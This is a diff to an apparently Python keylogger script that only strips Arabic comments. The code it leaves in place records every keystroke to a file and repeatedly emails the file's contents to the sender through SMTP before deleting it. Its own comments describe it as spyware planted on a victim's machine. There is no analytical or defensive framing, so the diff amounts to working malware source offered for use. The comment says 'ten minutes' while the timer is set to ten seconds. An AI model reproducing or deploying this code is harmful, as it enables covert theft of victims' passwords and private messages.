@@ -3,11 +3,10 @@ from threading import Timer
 import os 
 from smtplib import SMTP
 
-###A keylogger is a spyware program that
+#A keylogger is a spyware program that
 #is hidden via e-mail or that you download to the victim's machine and sends everything
 #written on the keyboard to the spyware's owner or the sender of the program.
-###برنامج التجسس وهو برنامج مخفي يتم إرساله عبر البريد الإلكتروني 
-#أو تقوم بتنزيله على جهاز الضحية ويرسل كل شيء مكتوب على لوحة المفاتيح إلى مالك برنامج التجسس أو مرسل البرنامج.
+
 
 
 A = '\033[1;10m'
@@ -40,7 +39,7 @@ def key_pressed(key):
         else:
             press = str(key)
     
-    f = open("keyfile.txt", 'a') #Everything that will be written will be saved in this file #سيتم حفظ كل ما سيتم كتابته في هذا الملف
+    f = open("keyfile.txt", 'a') #Everything that will be written will be saved in this file 
     f.write(press)
     f.close()
 
@@ -54,12 +53,12 @@ def send_email(email , password , msg):
 
 
 def timer():
-    ti = Timer(10,timer) #The file information will be sent to you via email every ten minutes #سيتم إرسال معلومات الملف إليك عبر البريد الإلكتروني كل عشر دقائق
+    ti = Timer(10,timer) #The file information will be sent to you via email every ten minutes 
     ti.start()
     try:
         f = open("keyfile.txt", "r")
         keyfile = f.read()
-        send_email("enter gmail ادخل الجيميل","enter password ادخل الباسورد",keyfile) 
+        send_email("enter gmail","enter password",keyfile) 
         os.remove("keyfile.txt")
     except:
         npthing = ""
